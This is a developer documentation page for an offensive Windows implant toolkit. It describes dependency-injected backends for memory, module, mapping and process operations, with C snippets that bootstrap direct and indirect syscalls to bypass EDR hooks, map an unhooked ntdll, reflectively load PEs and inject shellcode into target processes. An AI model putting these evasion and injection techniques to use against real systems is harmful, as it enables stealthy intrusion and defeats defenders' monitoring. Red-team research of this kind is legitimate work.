# Dependency Injection

SindriKit decouples **offensive intent** (load this PE, inject into that process) from **execution mechanics** (Win32, NT stubs, or direct syscalls). Domain code never calls the OS directly — it dispatches through function-pointer tables injected into each operation's context.

Contract definitions: `include/sindri/primitives/os_api.h`.

---

## Why DI instead of hardcoded APIs

| Problem | DI solution |
|---|---|
| Refactoring cost when switching evasion tiers | Change one struct pointer at init time |
| Import table / string signatures | Hash-based module/export resolution on `_nt` backends |
| EDR userland hooks | Route through `_sys` backends after syscall bootstrap |

---

## API tables

### Memory (`snd_memory_api_t`)

| Callback | Typical backing |
|---|---|
| `alloc` | `VirtualAlloc` / `NtAllocateVirtualMemory` / direct syscall |
| `free` | `VirtualFree` / `NtFreeVirtualMemory` / syscall |
| `protect` | `VirtualProtect` / `NtProtectVirtualMemory` / syscall |

**Global instances:** `snd_mem_win`, `snd_mem_nt`, `snd_mem_sys` — `include/sindri/primitives/memory.h`

### Modules (`snd_module_api_t`)

| Callback | Role |
|---|---|
| `load_library` | Load DLL by name |
| `get_proc_address` | Resolve export by name |
| `get_module_base` | Resolve loaded module by wide name |
| `get_proc_address_hash` | Resolve export by compile-time hash |
| `get_module_base_hash` | Resolve module by hash |

**Global instances:** `snd_mod_win`, `snd_mod_nt` — `include/sindri/primitives/modules.h`

There is **no** `snd_mod_sys`. Import resolution during reflective load uses PEB + EAT parsing (`snd_mod_nt`) even in full syscall profiles.

> [!NOTE]
> `snd_mod_win` leaves hash callbacks NULL — hash resolution requires `snd_mod_nt`.

### Mapping (`snd_mapping_api_t`)

| Callback | Role |
|---|---|
| `open` | Open a named section (e.g. `\KnownDlls\ntdll.dll`) |
| `view` | Map view into caller process |
| `close` | Close section handle |

**Global instances:** `snd_map_win`, `snd_map_nt`, `snd_map_sys` — `include/sindri/primitives/mapping.h`

### Process (`snd_process_api_t`)

| Callback | Role |
|---|---|
| `open_process` | Acquire target process handle |
| `alloc_remote` | Remote virtual allocation |
| `write_remote` | Cross-process write |
| `protect_remote` | Remote protection change |
| `create_remote_thread` | Start execution in target |
| `close_handle` | Release handle |

**Global instances:** `snd_proc_win`, `snd_proc_nt`, `snd_proc_sys` — `include/sindri/primitives/process.h`

---

## Backend naming convention

| Suffix | Paradigm | Available for |
|---|---|---|
| `_win` | Documented Win32 APIs | memory, modules, mapping, process |
| `_nt` | NT function pointers resolved via PEB walk + EAT parse | memory, modules, mapping, process |
| `_sys` | Direct or indirect syscalls (configurable invoker) | memory, mapping, process — **not** modules |

### OpSec profile examples

| Profile | Typical injection |
|---|---|
| Diagnostic | `mem_api = &snd_mem_win`, `mod_api = &snd_mod_win`, `proc_api = &snd_proc_win` |
| NT stubs | `mem_api = &snd_mem_nt`, `mod_api = &snd_mod_nt` |
| Full syscalls | `mem_api = &snd_mem_sys`, `mod_api = &snd_mod_nt`, `proc_api = &snd_proc_sys`, mapping via `snd_map_nt` for KnownDlls |

PoC mapping: [Examples OpSec table](../examples/README.md).

---

## Syscall bootstrap (prerequisite for `_sys`)

`_sys` backends call `snd_syscall_resolve()` internally. The resolver needs a registered `ntdll` image and a strategy chain:

```c
PVOID ntdll = NULL;
snd_om_knowndll_map(&snd_map_nt, L"ntdll.dll", &ntdll);  // or disk / PEB

snd_syscall_set_ntdll(ntdll);
snd_syscall_set_resolver(snd_syscall_resolve_ssn_scan);
snd_syscall_add_resolver(snd_syscall_resolve_ssn_sort);

snd_syscall_set_invoker(snd_syscall_direct_invoke_asm);
// or for indirect syscalls:
// snd_syscall_set_invoker(snd_syscall_indirect_invoke_asm);
// snd_syscall_set_gadget_finder(snd_syscall_find_gadget_scan);
```

This is **global execution state**, not part of any DI table. Implant init code runs it once; all `_sys` tables benefit.

Details: [Syscalls pipeline](../domains/primitives/syscalls/pipeline.md).

---

## Object manager composition

`snd_om_knowndll_map()` (`include/sindri/primitives/object_manager.h`) composes a **`snd_mapping_api_t`** into a single KnownDlls workflow:

```c
snd_status_t snd_om_knowndll_map(
    const snd_mapping_api_t *config,
    const wchar_t *dll_name,
    PVOID *out_base);
```

Uses `\KnownDlls\` on x64 and `\KnownDlls32\` on x86 (`SND_TARGET_KNOWNDLLS_DIR`). Primary use case: obtain an unhooked `ntdll` for SSN scanning.

---

## Parser integration

**Import fixup** (`snd_pe_resolve_imports`) uses the injected **`mod_api`** callbacks — `load_library`, `get_proc_address`, and hash variants — not standalone parser resolvers.

**Export forwarders** (`snd_pe_get_export_address*`) accept a single wide-name resolver:

- `snd_module_resolver_cb` — `const wchar_t *module_name, PVOID *out_base`

There is no hash-based forwarder resolver; forwarder DLL prefixes are converted to wide strings before lookup. Typical wiring: pass `snd_peb_get_module_base` when using `snd_mod_nt`.

Parsers do not embed Win32 calls; resolution behavior comes from the injected `mod_api` table and caller-supplied forwarder callbacks.

---

## Injecting into contexts

### Reflective loader

```c
snd_ldr_pe_ctx_t ctx = {0};
ctx.mem_api    = &snd_mem_sys;   // or snd_mem_win / snd_mem_nt
ctx.mod_api    = &snd_mod_nt;
ctx.raw_source = &file_buf;

snd_ldr_pe_prepare_image(&ctx);
snd_ldr_pe_execute_image(&ctx);
```

The loader engine calls `ctx->mem_api->alloc`, `ctx->mod_api->get_proc_address`, etc. — never `VirtualAlloc` directly.

### Injection

```c
snd_inj_ctx_t inj = {0};
inj.target_pid = pid;
inj.payload    = &shellcode_buf;
inj.proc_api   = &snd_proc_sys;

snd_inj_classic_shell(&inj);
snd_inj_cleanup(&inj);
```

PE injection adds a **second** context for local bake:

```c
snd_ldr_pe_ctx_t ldr = {0};
ldr.mem_api = &snd_mem_sys;
ldr.mod_api = &snd_mod_nt;
// inj.proc_api = &snd_proc_sys;

snd_inj_classic_pe(&ldr, &inj);
```

---

## Custom backends (BYOM)

Any table can point at implant-specific functions as long as signatures match `os_api.h`:

```c
static snd_status_t my_alloc(LPVOID address, SIZE_T size, DWORD type, DWORD protect, LPVOID *out) {
    /* hypervisor, shared section, ROP-assisted alloc, … */
}

const snd_memory_api_t my_mem = {
    .alloc   = my_alloc,
    .free    = my_free,
    .protect = my_protect,
};

ctx.mem_api = &my_mem;
```

The loader/injection state machines and stage validation remain unchanged.

---

## Rules for new domains

1. Define a context struct holding DI pointers and a `stage` enum.
2. Validate `stage` before each engine step; return `SND_STATUS_INVALID_STAGE_SEQUENCE` on violation.
3. Expose a chain function for one-shot use and granular engine functions for staged/resumable workflows.
4. Never import another domain's internals — share behavior through primitives and parsers only.

See [State machines](state_machines.md) and [Domains independence](../domains/README.md).
